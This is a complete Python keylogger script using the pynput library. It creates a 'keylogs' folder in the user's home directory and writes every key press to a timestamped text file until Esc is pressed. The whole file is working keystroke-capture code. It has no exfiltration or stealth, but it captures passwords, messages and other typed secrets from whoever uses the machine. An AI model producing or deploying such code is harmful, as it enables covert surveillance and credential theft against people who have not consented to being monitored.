import os
import time
from pynput.keyboard import Key, Listener

# Define the folder name and create it in the user's home directory
log_folder = os.path.join(os.path.expanduser("~"), "keylogs")
os.makedirs(log_folder, exist_ok=True)

# Generate a timestamp for the log file
def get_timestamp():
 return time.strftime("%Y-%m-%d_%H-%M-%S")

# Define a function to create a new log_file
def create_new_log_file():
    timestamp = get_timestamp()
    log_filename = os.path.join(log_folder, f"keylog_{timestamp}.txt")
    return log_filename

# Define a function to write the key presses to a log file.
def write_to_log(log_file, key):
    log_file.write(str(key) + "\n")
    log_file.flush()
    
# Define a function that listens for key presses and writes them to the log file.
def on_key_press(key):
    if key == Key.esc:
        # Stop keylogger
        return False
    write_to_log(current_log_file, key)

current_log_file = open(create_new_log_file(), "a")    

# Set up the keylogger
with Listener(on_press=on_key_press) as listener:
    listener.join()
